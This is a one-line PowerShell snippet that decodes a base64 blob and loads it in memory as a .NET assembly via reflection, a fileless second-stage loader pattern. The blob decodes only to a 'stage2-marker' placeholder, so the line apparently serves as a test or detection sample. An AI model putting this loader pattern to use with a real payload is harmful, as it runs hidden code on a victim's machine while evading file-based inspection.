
$PayloadBytes = [Convert]::FromBase64String("c3RhZ2UyLW1hcmtlcjpjMnp5OHcxbWpv"); Write-Verbose ("Assembly bytes: " + $PayloadBytes.Length); [Reflection.Assembly]::Load($PayloadBytes); $PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
